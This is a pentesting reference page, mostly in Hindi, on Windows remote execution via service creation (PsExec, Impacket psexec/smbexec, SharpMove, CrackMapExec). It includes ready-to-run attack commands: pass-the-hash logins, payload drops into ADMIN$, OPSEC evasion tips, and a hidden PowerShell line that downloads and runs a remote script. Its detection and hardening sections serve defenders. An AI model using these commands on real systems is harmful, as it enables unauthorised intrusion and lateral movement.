# PsExec/Winexec/ScExec/SMBExec

{{#include ../../banners/hacktricks-training.md}}

## ये कैसे काम करते हैं

ये techniques SMB/RPC के माध्यम से Windows Service Control Manager (SCM) का remotely दुरुपयोग करके target host पर commands execute करती हैं। सामान्य flow इस प्रकार है:

1. Target पर authenticate करें और SMB (TCP/445) के माध्यम से ADMIN$ share को access करें।
2. किसी executable को copy करें या ऐसी LOLBAS command line specify करें जिसे service run करेगी।
3. SCM (MS-SCMR over \PIPE\svcctl) के माध्यम से remotely एक service create करें, जो उस command या binary की ओर point करती हो।
4. Payload execute करने के लिए service start करें और optional रूप से named pipe के माध्यम से stdin/stdout capture करें।
5. Service को stop करें और cleanup करें (service तथा छोड़ी गई binaries को delete करें)।

Requirements/prereqs:
- Target पर Local Administrator (SeCreateServicePrivilege) या target पर explicit service creation rights।
- SMB (445) reachable हो और ADMIN$ share available हो; host firewall के माध्यम से Remote Service Management allowed हो।
- UAC Remote Restrictions: local accounts के साथ token filtering network पर admin access को block कर सकती है, जब तक built-in Administrator या LocalAccountTokenFilterPolicy=1 का उपयोग न किया जाए।
- Kerberos vs NTLM: hostname/FQDN का उपयोग करने पर Kerberos enable होता है; IP से connect करने पर अक्सर NTLM fallback होता है (और hardened environments में इसे block किया जा सकता है)।

### sc.exe के माध्यम से Manual ScExec/WinExec

निम्नलिखित एक minimal service-creation approach दिखाता है। Service image कोई dropped EXE या cmd.exe अथवा powershell.exe जैसा LOLBAS हो सकता है।
```cmd
:: Execute a one-liner without dropping a binary
sc.exe \\TARGET create HTSvc binPath= "cmd.exe /c whoami > C:\\Windows\\Temp\\o.txt" start= demand
sc.exe \\TARGET start HTSvc
sc.exe \\TARGET delete HTSvc

:: Drop a payload to ADMIN$ and execute it (example path)
copy payload.exe \\TARGET\ADMIN$\Temp\payload.exe
sc.exe \\TARGET create HTSvc binPath= "C:\\Windows\\Temp\\payload.exe" start= demand
sc.exe \\TARGET start HTSvc
sc.exe \\TARGET delete HTSvc
```
Notes:
- non-service EXE शुरू करते समय timeout error की अपेक्षा करें; execution फिर भी होता है।
- अधिक OPSEC-friendly बने रहने के लिए fileless commands (cmd /c, powershell -enc) को प्राथमिकता दें या dropped artifacts को delete कर दें।

अधिक detailed steps यहाँ मिलेंगे: https://blog.ropnop.com/using-credentials-to-own-windows-boxes-part-2-psexec-and-services/<sup>[[3]](#references)</sup>

## Tooling और examples

### Sysinternals PsExec.exe

- Classic admin tool जो SMB का उपयोग करके ADMIN$ में PSEXESVC.exe drop करता है, एक temporary service (default name PSEXESVC) install करता है, और named pipes पर I/O proxy करता है।
- Example usages:<sup>[[1]](#references)</sup>
```cmd
:: Interactive SYSTEM shell on remote host
PsExec64.exe -accepteula \\HOST -s -i cmd.exe

:: Run a command as a specific domain user
PsExec64.exe -accepteula \\HOST -u DOMAIN\user -p 'Passw0rd!' cmd.exe /c whoami /all

:: Customize the service name for OPSEC (-r)
PsExec64.exe -accepteula \\HOST -r WinSvc$ -s cmd.exe /c ipconfig
```
- आप Sysinternals Live से WebDAV के माध्यम से सीधे launch कर सकते हैं:
```cmd
\\live.sysinternals.com\tools\PsExec64.exe -accepteula \\HOST -s cmd.exe /c whoami
```
OPSEC
- Service install/uninstall events छोड़ता है (Service name अक्सर PSEXESVC होता है, जब तक -r का उपयोग न किया जाए) और execution के दौरान C:\Windows\PSEXESVC.exe बनाता है।

### Impacket psexec.py (PsExec-like)

- Embedded RemCom-like service का उपयोग करता है। ADMIN$ के माध्यम से एक transient service binary (आमतौर पर randomized name) drop करता है, एक service बनाता है (default आमतौर पर RemComSvc), और named pipe पर I/O को proxy करता है।
```bash
# Password auth
psexec.py DOMAIN/user:Password@HOST cmd.exe

# Pass-the-Hash
psexec.py -hashes LMHASH:NTHASH DOMAIN/user@HOST cmd.exe

# Kerberos (use tickets in KRB5CCNAME)
psexec.py -k -no-pass -dc-ip 10.0.0.10 DOMAIN/user@host.domain.local cmd.exe

# Change service name and output encoding
psexec.py -service-name HTSvc -codec utf-8 DOMAIN/user:Password@HOST powershell -nop -w hidden -c "iwr http://10.10.10.1/a.ps1|iex"
```
आर्टिफैक्ट्स
- C:\Windows\ में Temporary EXE (random 8 chars)। Service name डिफ़ॉल्ट रूप से RemComSvc रहता है, जब तक कि इसे override न किया जाए।

### Impacket smbexec.py (SMBExec)

- एक Temporary service बनाता है, जो cmd.exe को spawn करता है और I/O के लिए named pipe का उपयोग करता है। आमतौर पर full EXE payload drop करने से बचता है; command execution semi-interactive होता है।
```bash
smbexec.py DOMAIN/user:Password@HOST
smbexec.py -hashes LMHASH:NTHASH DOMAIN/user@HOST
```
### SharpLateral और SharpMove

- [SharpLateral](https://github.com/mertdas/SharpLateral) (C#) service-based exec सहित कई lateral movement methods को implement करता है।
```cmd
SharpLateral.exe redexec HOSTNAME C:\\Users\\Administrator\\Desktop\\malware.exe.exe malware.exe ServiceName
```
- [SharpMove](https://github.com/0xthirteen/SharpMove) में remotely एक command execute करने के लिए service modification/creation शामिल है।
```cmd
SharpMove.exe action=modsvc computername=remote.host.local command="C:\windows\temp\payload.exe" amsi=true servicename=TestService
SharpMove.exe action=startservice computername=remote.host.local servicename=TestService
```
- आप CrackMapExec का उपयोग अलग-अलग backends (psexec/smbexec/wmiexec) के माध्यम से execute करने के लिए भी कर सकते हैं:
```bash
cme smb HOST -u USER -p PASS -x "whoami" --exec-method psexec
cme smb HOST -u USER -H NTHASH -x "ipconfig /all" --exec-method smbexec
```
## OPSEC, detection और artifacts

PsExec-जैसी techniques का उपयोग करते समय सामान्य host/network artifacts:
- उपयोग किए गए admin account के लिए target पर Security 4624 (Logon Type 3) और 4672 (Special Privileges)।
- Security 5140/5145 File Share और File Share Detailed events, जिनमें ADMIN$ access और service binaries (जैसे, PSEXESVC.exe या random 8-char .exe) को create/write करना दिखाई देता है।
- Target पर Security 7045 Service Install: PSEXESVC, RemComSvc या custom (-r / -service-name) जैसे service names।
- services.exe या service image के लिए Sysmon 1 (Process Create), 3 (Network Connect), C:\Windows\ में 11 (File Create), 17/18 (Pipe Created/Connected); pipes जैसे \\.\pipe\psexesvc, \\.\pipe\remcom_* या randomized equivalents।
- Sysinternals EULA के लिए Registry artifact: operator host पर HKCU\Software\Sysinternals\PsExec\EulaAccepted=0x1 (यदि suppressed नहीं है)।

## Hunting ideas
- उन service installs पर alert करें जिनमें ImagePath में cmd.exe /c, powershell.exe या TEMP locations शामिल हों।
- ऐसी process creations खोजें जिनमें ParentImage C:\Windows\PSEXESVC.exe हो या services.exe के children LOCAL SYSTEM के रूप में shells execute कर रहे हों।
- -stdin/-stdout/-stderr पर समाप्त होने वाले named pipes या well-known PsExec clone pipe names को flag करें।

## सामान्य failures की Troubleshooting
- Services create करते समय Access is denied (5): वास्तव में local admin नहीं है, local accounts के लिए UAC remote restrictions लागू हैं, या service binary path पर EDR tampering protection सक्रिय है।
- The network path was not found (53) या ADMIN$ से connect नहीं हो सका: firewall SMB/RPC को block कर रहा है या admin shares disabled हैं।
- Kerberos fail होता है लेकिन NTLM blocked है: hostname/FQDN (IP नहीं) का उपयोग करके connect करें, proper SPNs सुनिश्चित करें, या Impacket का उपयोग करते समय tickets के साथ -k/-no-pass supply करें।
- Service start timeout हो जाता है लेकिन payload run हो गया: यदि यह real service binary नहीं है तो यह expected है; output को file में capture करें या live I/O के लिए smbexec का उपयोग करें।

## Hardening notes
- Windows 11 24H2 और Windows Server 2025 outbound (और Windows 11 inbound) connections के लिए default रूप से SMB signing require करते हैं। Valid creds के साथ legitimate PsExec usage इससे नहीं टूटता, लेकिन unsigned SMB relay abuse रुकता है और ऐसे devices प्रभावित हो सकते हैं जो signing support नहीं करते।<sup>[[2]](#references)</sup>
- New SMB client NTLM blocking (Windows 11 24H2/Server 2025) IP से या non-Kerberos servers से connect करते समय NTLM fallback को रोक सकता है। Hardened environments में इससे NTLM-based PsExec/SMBExec काम करना बंद कर देंगे; Kerberos (hostname/FQDN) का उपयोग करें या legitimately आवश्यक होने पर exceptions configure करें।<sup>[[2]](#references)</sup>
- Least privilege का principle: local admin membership कम से कम रखें, Just-in-Time/Just-Enough Admin को प्राथमिकता दें, LAPS enforce करें और 7045 service installs पर monitor/alert करें।

## यह भी देखें

- WMI-based remote exec (अक्सर अधिक fileless):

{{#ref}}
./wmiexec.md
{{#endref}}

- WinRM-based remote exec:

{{#ref}}
./winrm.md
{{#endref}}

## References

- [1] [PsExec - Sysinternals | Microsoft Learn](https://learn.microsoft.com/sysinternals/downloads/psexec)
- [2] [Windows Server 2025 और Windows 11 में SMB security hardening](https://techcommunity.microsoft.com/blog/filecab/smb-security-hardening-in-windows-server-2025--windows-11/4226591)
- [3] [Credentials का उपयोग करके Windows Boxes Own करना - Part 2 (PSExec और Services)](https://blog.ropnop.com/using-credentials-to-own-windows-boxes-part-2-psexec-and-services/)

{{#include ../../banners/hacktricks-training.md}}
